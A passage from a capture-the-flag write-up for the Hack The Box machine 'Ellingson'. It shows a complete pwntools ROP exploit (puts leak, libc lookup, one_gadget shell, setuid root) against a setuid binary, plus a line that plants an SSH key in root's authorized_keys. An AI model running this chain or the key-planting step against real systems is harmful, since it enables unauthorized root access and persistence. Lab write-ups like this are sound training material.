RCX: 0x7ffff7ec5804 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f988c0 --> 0x0
RSI: 0x4059c0 ("access denied.\nssword: ")
RDI: 0x0
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdf68 ("BBBBBBBB")
RIP: 0x401618 (<auth+261>:      ret)
R8 : 0x7ffff7f9d500 (0x00007ffff7f9d500)
R9 : 0x7ffff7f97848 --> 0x7ffff7f97760 --> 0xfbad2a84
R10: 0xfffffffffffff638
R11: 0x246
R12: 0x401170 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe060 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40160d <auth+250>: call   0x401050 <puts@plt>
   0x401612 <auth+255>: mov    eax,0x0
   0x401617 <auth+260>: leave  
=> 0x401618 <auth+261>: ret    
   0x401619 <main>:     push   rbp
   0x40161a <main+1>:   mov    rbp,rsp
   0x40161d <main+4>:   sub    rsp,0x10
   0x401621 <main+8>:   mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf68 ("BBBBBBBB")
0008| 0x7fffffffdf70 --> 0x7fffffffe000 --> 0x0
0016| 0x7fffffffdf78 --> 0x0
0024| 0x7fffffffdf80 --> 0x401740 (<__libc_csu_init>:   push   r15)
0032| 0x7fffffffdf88 --> 0x7ffff7dff09b (<__libc_start_main+235>:       mov    edi,eax)
0040| 0x7fffffffdf90 --> 0x0
0048| 0x7fffffffdf98 --> 0x7fffffffe068 --> 0x7fffffffe381 ("/media/sf_CTFs/hackthebox/ellingson-10.10.10.139/garbage")                                                                                                                     
0056| 0x7fffffffdfa0 --> 0x100040000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401618 in auth ()

```

I can see 8 `B`s waiting to be moved into RIP.

### Strategy

I’m going to do this in two stages. At the start, I only know the addresses of the functions in the PLT. So I will use one of those, `puts`, to leak the address of one of the functions from the GOT. Then, I can use that to find the libc base address in the current program. On returning from that `puts`, I’ll have it return to the main program, which I’ll overflow again. This time, knowing the libc address space, I can do a normal return to libc attack. I’ll construct a payload to run a shell.

If you’re not comfortable with PLT and GOT, you should check out [this video from LiveOverflow](https://www.youtube.com/watch?v=kUk5pw4w0h4&vl=en).

### Collect Addresses

For stage one, I’m going to call puts to leak the address. I’ll need the puts PLT address to call, a `pop rdi` gadget to load something into RDI to `put`, and the `put` GOT address (the value that I’m leaking).

#### pop rdi

To get the `pop rdi` gadget, I’ll use [rop-tool](https://github.com/t00sh/rop-tool).

```

root@kali# rop-tool gadget garbage | grep rdi
 0x000000000040179b -> pop rdi; ret ; 

```

#### puts PLT and GOT

I need the `puts` PLT address. This is the address I’ll see in the main code when I run `disassemble main` in `gdb`:

```

gdb-peda$ disassemble main
Dump of assembler code for function main:
...[snip]...
   0x000000000040164a <+49>:    lea    rdi,[rip+0xb3f]        # 0x402190
   0x0000000000401651 <+56>:    call   0x401050 <puts@plt>

```

I also need the address in the GOT for `puts`. This will hold the pointer to `puts` in libc, and is what I want to leak. If I run `disassemble [plt address]`, I can see the code there:

```

gdb-peda$ disassemble 0x401050
Dump of assembler code for function puts@plt:
   0x0000000000401050 <+0>:     jmp    QWORD PTR [rip+0x2fd2]        # 0x404028 <puts@got.plt>
   0x0000000000401056 <+6>:     push   0x2
   0x000000000040105b <+11>:    jmp    0x401020
End of assembler dump.

```

And that code shows the GOT address, 0x404028.

I can more easily get these two addresses by running `objdump`:

```

root@kali# objdump -D garbage | grep puts@GLIBC
  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>

```

The PLT address is at the start of the line, and the GOT is at the end.

#### Main

I also need the address of main, so that I can start the program over and get a second chance to overflow it without the ASLR resetting. I can `disassemble main` and get it, or get it with `objdump`:

```

root@kali# objdump -D garbage | grep '<main>'
0000000000401619 <main>:

```

Were PIE enabled, this address would change on each run, but as it isn’t, it will be static.

### Run Stage 1

Putting this all together, I’ll use the `pwntools` Python library to create an ssh connection as margo, and then run the overflow. Here’s the script so far:

```

#!/usr/bin/env python

from pwn import *

#context.log_level = "DEBUG"
sshConn = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
garbage = sshConn.process('garbage')

junk     = "A" * 136      # offset from pattern
pop_rdi  = p64(0x40179b)  # rop-tool gadget garbage | grep rdi
puts_plt = p64(0x401050)  # objdump -D garbage | grep puts@GLIBC
puts_got = p64(0x404028)  # objdump -D garbage | grep puts@GLIBC
main     = p64(0x401619)  # objdump -D garbage | grep '<main>' 

stage_1 = junk + pop_rdi + puts_got + puts_plt
garbage.sendline(stage_1)
garbage.recvuntil("access denied.\n")
leaked_puts = u64(garbage.recvline()[:-1].ljust(8, '\x00'))
log.success("Leaked puts address: 0x%x" % leaked_puts)

```

When I run it, I get the leaked address:

```

root@kali# python root_shell.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process 'garbage' on 10.10.10.139: pid 1900
[+] Leaked puts address: 0x7fd75a5239c0

```

### Collect Offsets

#### get libc

Since I already have a shell, I can go on box and check libc and get the version and offsets from there. Another alteriative is to use a tool I wanted to highlight, [libc database,](https://github.com/niklasb/libc-database) which is useful for a case where you can get a leak, but perhaps don’t already have a low priv shell to get the libc version.

I know the address of the leak from the previous run. I’ll feed the low three nibbles into the database:

```

root@kali:/opt/libc-database# ./find puts 9c0
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
archive-old-glibc (id libc6_2.3.6-0ubuntu20_i386)

```

It returns two possible libc version. Since I believe this is a x64 host, I’ll use the first one. I can get other offsets from the db, but I can also just download a copy:

```

root@kali:/opt/libc-database# ./download libc6_2.27-3ubuntu1_amd64
Getting libc6_2.27-3ubuntu1_amd64
  -> Location: http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.27-3ubuntu1_amd64

```

I can show it’s the same one as target:

```

root@kali:/opt/libc-database# scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 /tmp/
margo@10.10.10.139's password:
libc.so.6                                        100% 1983KB   1.0MB/s   00:01    

root@kali:/opt/libc-database# md5sum /tmp/libc.so.6 libs/libc6_2.27-3ubuntu1_amd64/libc.so.6
50390b2ae8aaa73c47745040f54e602f  /tmp/libc.so.6
50390b2ae8aaa73c47745040f54e602f  libs/libc6_2.27-3ubuntu1_amd64/libc.so.6

```

#### puts Offset

Since I’m leaking `puts`, I need that offset to the start of libc:

```

margo@ellingson:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@GLIBC"
   422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5

```

Now I can find the offset to `puts` in this libc. I can subtract this value from any leak to get the current libc base address.

### One Gadget

I’ve been meaning to play with [one\_gadget](https://github.com/david942j/one_gadget), so I gave it a run. The install was easy with `gem install one_gadget`. Then I just ran it on the libc from target:

```

root@kali:/opt/libc-database# one_gadget libs/libc6_2.27-3ubuntu1_amd64/libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

It gave three possible options of addresses to jump to which would run `sh`.

In testing, the first one didn’t work, but the second one did.

### Low Priv Shell

I put all that together and get this:

```

#!/usr/bin/env python

from pwn import *

#context.log_level = "DEBUG"
sshConn = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
garbage = sshConn.process('garbage')

junk     = "A" * 136      # offset from pattern
pop_rdi  = p64(0x40179b)  # rop-tool gadget garbage | grep rdi
puts_plt = p64(0x401050)  # objdump -D garbage | grep puts@GLIBC
puts_got = p64(0x404028)  # objdump -D garbage | grep puts@GLIBC
main     = p64(0x401619)  # objdump -D garbage | grep '<main>' 

stage_1 = junk + pop_rdi + puts_got + puts_plt + main
garbage.sendline(stage_1)
garbage.recvuntil("access denied.\n")
leaked_puts = u64(garbage.recvline()[:-1].ljust(8, '\x00'))
log.success("Leaked puts address: 0x%x" % leaked_puts)
garbage.recvuntil("Enter access password: ")

# offsets
libc_puts    = 0x809c0  # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@GLIBC"
libc_exec_sh = 0x4f322  # one_gadget gadget garbage
libc_base   = leaked_puts - libc_puts

stage_2 = junk + p64(libc_exec_sh + libc_base)
garbage.sendline(stage_2)
garbage.recvuntil("access denied.")
garbage.interactive()

```

It works, but I am still margo:

```

root@kali# python ./root_shell-lowpriv.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process 'garbage' on 10.10.10.139: pid 1994
[+] Leaked puts address: 0x7fbb9651b9c0
[*] Switching to interactive mode

$ $ id
uid=1002(margo) gid=1002(margo) groups=1002(margo)

```

The program is dropping privilege. I can use setuid to get back to root.

### More Offsets

```

root@kali:/opt/libc-database# readelf -s libs/libc6_2.27-3ubuntu1_amd64/libc.so.6 | grep " setuid@@GLIBC"
    23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5

```

I’ll add this to my rop.

### root Shell

Now I have a script that gives me a root shell:

```

#!/usr/bin/env python

from pwn import *

#context.log_level = "DEBUG"
sshConn = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
garbage = sshConn.process('garbage')

junk     = "A" * 136      # offset from pattern
pop_rdi  = p64(0x40179b)  # rop-tool gadget garbage | grep rdi
puts_plt = p64(0x401050)  # objdump -D garbage | grep puts@GLIBC
puts_got = p64(0x404028)  # objdump -D garbage | grep puts@GLIBC
main     = p64(0x401619)  # objdump -D garbage | grep '<main>' 

stage_1 = junk + pop_rdi + puts_got + puts_plt + main
garbage.sendline(stage_1)
garbage.recvuntil("access denied.\n")
leaked_puts = u64(garbage.recvline()[:-1].ljust(8, '\x00'))
log.success("Leaked puts address: 0x%x" % leaked_puts)
garbage.recvuntil("Enter access password: ")

# offsets
libc_puts    = 0x809c0  # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@GLIBC"
libc_exec_sh = 0x4f322  # one_gadget gadget garbage
libc_setuid  = 0xe5970  # readelf -s libs/libc6_2.27-3ubuntu1_amd64/libc.so.6 | grep " setuid@@GLIBC"
libc_base   = leaked_puts - libc_puts

stage_2 = junk + pop_rdi + p64(0) + p64(libc_setuid + libc_base) + p64(libc_exec_sh + libc_base)
garbage.sendline(stage_2)
garbage.recvuntil("access denied.")
garbage.sendline('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0SwpwZ7rgMtCZYzkDtFJvQZO20N+8DmYxOix+PgL6VQW/9wZC3xnKK1zeAelMYtv/O38GXE2ghUH7z6ayVmTMkjGqt18mhsEpCt0BbonGRC0IHoBsV5QBVNin+x1soVdECT1Tr45bNnTnkZXIgSyDumc+    2Ix6A1wiiC5RbI3SrxJ7nL0lRlhjdoAH6KCb4dwhX+Jos0VudHRreE01+0YE0Qb7Sd0eA5Cq7UtjgiW6VyXcmWH7aQdVZlUanrs5wdwWYeVCxY/XfFCCDmHZw+8W5INudM2t7on7bl/rYnhAExOr14/1s7LfYAfV8B6VNPPX+IOzOcT4aYQC3rRDiG5P root@kali" >> /root/.ssh/      authorized_keys')
garbage.interactive()

```

I added a line to write my public key into root’s `authorized_keys` file, just for extra access.

When I run it, I have a shell, and can get the flag:

```

root@kali# ./root_shell.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process 'garbage' on 10.10.10.139: pid 24021
[+] Leaked puts address: 0x7f2c6ea789c0
[*] Switching to interactive mode

# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
# $ cat /root/root.txt
1cc73a44...

```

## Beyond Root

### Broken Priv

The one thing about this box I really didn’t enjoy was that the privesc relies on misconfigured permissions to `shadow.bak`, and those permissions are reset to correct (patching the box making privesc impossible) in a cron that runs daily.

The file `passwd` in `/etc/cron.daily` is the issue:

```

root@ellingson:/var/backups# cat /etc/cron.daily/passwd 
#!/bin/sh

cd /var/backups || exit 0

for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done

```

The script runs `chmod 600` on the file, which limits access only to the owner of the file, while I had accessed it because of hal’s membership in the adm group.

This will run daily at 6:25 am:

```

root@ellingson:~# cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

So while the box presents this as something hal can read before the cron:

```

root@ellingson:/var/backups# ls -l /var/backups/shadow.bak
-rw-r----- 1 root adm 1309 Mar  9  2019 shadow.bak

```

Once the script runs, the permissions change:

```

root@ellingson:/var/backups# uptime
 21:41:03 up 16:56,  3 users,  load average: 0.01, 0.10, 0.06
root@ellingson:/var/backups# ls -l /var/backups/shadow.bak 
-rw------- 1 root shadow 1330 Mar  9 22:21 /var/backups/shadow.bak

```

### Mail Cron

In looking around at crons, I noticed another one that was interesting:

```

root@ellingson:/var/backups# cat /var/spool/cron/crontabs/root 
...[snip]...
# m h  dom mon dow   command
#*/1 * * * * /home/theplague/ensure-message-present.sh

```

I’ll note that the cron itself is commented out, so nothing runs.

Looking at the script, it would put `mbox` into hals homedir:

```

root@ellingson:~# cat /home/theplague/ensure-message-present.sh 
#!/bin/bash
cp -f /home/theplague/mbox /home/hal/mbox
chown hal:hal /home/hal/mbox

```

On clean reset, hals dir is empty:

```

root@ellingson:~# ls /home/hal
root@ellingson:~# 

```

and it stays that way, since the cron is commented out.

So what’s in the mailbox?

```

root@ellingson:~# cat /home/theplague/mbox 
From theplague@ellingson  Sun Feb 10 18:28:29 2019
Return-Path: <theplague@ellingson>
X-Original-To: hal@localhost
Delivered-To: hal@localhost
Received: by ellingson.localdomain (Postfix, from userid 1000)
        id 913D4E094C; Sun, 10 Feb 2019 18:28:29 +0000 (UTC)
Subject: Get Your Users Under Control!
To: <hal@localhost>
X-Mailer: mail (GNU Mailutils 3.4)
Message-Id: <20190210182829.913D4E094C@ellingson.localdomain>
Date: Sun, 10 Feb 2019 18:28:29 +0000 (UTC)
From: Eugene Belford <theplague@ellingson>

Hal,
You hapless technoweenie, next time you see Margo tell her to change her password! Tell her to stop using varients of 'god' in here password!!! So no god, g0d, aG0D...she doesn't seem to get it despite the countless memos.

```

That would have been a good hint to cracking margo’s password. Maybe it was too much with the hint in the webpage? Or maybe it was supposed to be included and the comment was a mistake.